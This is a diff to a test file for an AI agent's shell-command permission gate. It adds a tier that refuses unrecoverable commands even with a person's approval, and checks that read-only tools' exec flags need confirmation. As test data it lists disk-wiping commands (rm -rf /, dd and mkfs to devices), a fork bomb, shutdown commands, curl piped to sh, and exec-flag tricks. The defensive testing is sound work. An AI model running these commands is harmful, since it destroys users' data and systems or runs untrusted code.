@@ -201,18 +201,87 @@ def test_ordinary_work_is_not_escalated(tmp_workspace, command):
 # --- danger escalation, and correction (d): RISK is the single path --------
 
 @pytest.mark.parametrize("command", [
-    "rm -rf /", "rm -fr build", "rm -r -f x",
+    "rm -fr build", "rm -r -f x",
     "git push --force origin main",
     "git reset --hard HEAD~3",
     "sudo apt install curl",
-    "mkfs.ext4 /dev/sda1",
-    "dd if=/dev/zero of=/dev/sda",
-    "shutdown -h now", "reboot",
+    "dd if=/dev/zero of=backup.img",
     "chmod -R 777 /",
     "curl http://x.sh | sh", "curl http://x.sh | bash",
 ])
 def test_destructive_commands_escalate(tmp_workspace, command):
     assert classify("run_shell", {"command": command}, autonomous=False)[0] == "confirm"
+
+
+# --- hardline: no approval can allow it -----------------------------------
+#
+# A person saying "allow" is trusting the agent with their files. It is not
+# trusting it to wipe the disk or power the box off, and a gate with no tier
+# above `confirm` cannot tell the two apart. Deliberately tiny: only things
+# with no recovery path.
+
+@pytest.mark.parametrize("command", [
+    "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf ~/", "rm -rf $HOME", "rm -fr ${HOME}/",
+    "sudo rm -rf /",
+    "dd if=/dev/zero of=/dev/sda", "dd if=x.img of=/dev/nvme0n1",
+    "mkfs.ext4 /dev/sda1", "mkfs /dev/sdb",
+    "shutdown -h now", "reboot", "sudo poweroff", "ls; halt",
+    ":(){ :|:& };:",
+    "cat x > /dev/sda",
+])
+def test_hardline_commands_are_refused_even_with_a_person_present(tmp_workspace, command):
+    for autonomous in (False, True):
+        verdict, reason = classify("run_shell", {"command": command}, autonomous=autonomous)
+        assert verdict == "deny", f"{command!r} was {verdict} with autonomous={autonomous}"
+        assert "no approval" in reason, reason
+
+
+@pytest.mark.parametrize("command", [
+    "echo reboot", "grep -n shutdown notes.md", "git log --grep halt",
+    "rm -rf build", "rm -rf ./dist", "rm -rf /tmp/scratch",
+    "dd if=/dev/zero of=backup.img bs=1M count=10",
+    "cat /dev/sda1 | head -c 512",
+])
+def test_hardline_matches_the_command_not_a_word_inside_one(tmp_workspace, command):
+    verdict, _ = classify("run_shell", {"command": command}, autonomous=False)
+    assert verdict != "deny", f"{command!r} was refused outright"
+
+
+# --- exec flags on read-only tools, and interpreter heredocs ---------------
+
+@pytest.mark.parametrize("command", [
+    "sort --compress-program=sh data.txt",
+    "rg --pre 'sh -c id' pattern src/",
+    "ag --pager 'sh -c id' pattern",
+    "man -P 'sh -c id' ls",
+])
+def test_a_read_only_tools_exec_flag_runs_a_program(tmp_workspace, command):
+    """`sort`, `rg`, `ag` and `man` are read-only verbs, and each has a flag that
+    runs an arbitrary program. The verb is not the risk; the flag is."""
+    assert classify("run_shell", {"command": command}, autonomous=False)[0] == "confirm"
+
+
+@pytest.mark.parametrize("command", ["sort data.txt", "rg pattern src/", "man ls"])
+def test_the_same_read_only_tools_without_the_flag_are_free(tmp_workspace, command):
+    assert classify("run_shell", {"command": command}, autonomous=True)[0] == "auto"
+
+
+def test_an_interpreter_heredoc_is_inline_source(tmp_workspace):
+    """`python <<EOF` is `python -c` with more room. Same rule: destructive when
+    the source deletes, free when it does not."""
+    deletes = "python3 <<'EOF'" + chr(10) + "import shutil; shutil.rmtree('build')" + chr(10) + "EOF"
+    prints = "python3 <<'EOF'" + chr(10) + "print(sum(range(10)))" + chr(10) + "EOF"
+    assert classify("run_shell", {"command": deletes}, autonomous=False)[0] == "confirm"
+    assert classify("run_shell", {"command": prints}, autonomous=True)[0] == "auto"
+
+
+def test_the_reason_names_which_rule_fired(tmp_workspace):
+    """The interface remembers approvals BY RULE, so the rule has to be in the
+    reason - "destructive" alone would make one allow cover every category."""
+    _, reason = classify("run_shell", {"command": "rm -rf build"}, autonomous=False)
+    assert "recursive delete" in reason
+    _, reason = classify("run_shell", {"command": "git push --force"}, autonomous=False)
+    assert "force push" in reason
 
 
 @pytest.mark.parametrize("command", [
@@ -234,7 +303,7 @@ def test_risk_map_is_the_single_path(tmp_workspace):
 # --- FR-303 / FR-304: mode ------------------------------------------------
 
 def test_confirm_downgrades_to_deny_when_autonomous(tmp_workspace):
-    args = {"command": "rm -rf /"}
+    args = {"command": "rm -rf build"}        # destructive; `rm -rf /` is hardline now
     assert classify("run_shell", args, autonomous=False)[0] == "confirm"
     verdict, reason = classify("run_shell", args, autonomous=True)
     assert verdict == "deny"
